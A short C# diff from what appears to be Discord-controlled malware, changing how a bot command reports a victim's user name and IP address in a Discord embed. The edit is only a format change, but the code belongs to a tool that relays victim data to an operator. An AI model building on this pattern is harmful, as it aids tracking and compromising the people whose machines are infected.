@@ -11,7 +11,7 @@ internal partial class Commands
         {
             EmbedBuilder e = new()
             {
-                Description = $"{VictimInformation.Shared.UserName}: {VictimInformation.Shared.ip}"
+                Description = $"{VictimInformation.Shared.UserName} -> {VictimInformation.Shared.IP}"
             };
             await cmdSket.RespondAsync(embed: e.Build());
         }
@@ -19,7 +19,7 @@ internal partial class Commands
         {
             EmbedBuilder e = new()
             {
-                Description = $"{VictimInformation.Shared.UserName}: {VictimInformation.Shared.ip}"
+                Description = $"{VictimInformation.Shared.UserName} -> {VictimInformation.Shared.IP}"
             };
             await cmdSket.Channel.SendMessageAsync(embed: e.Build());
         }
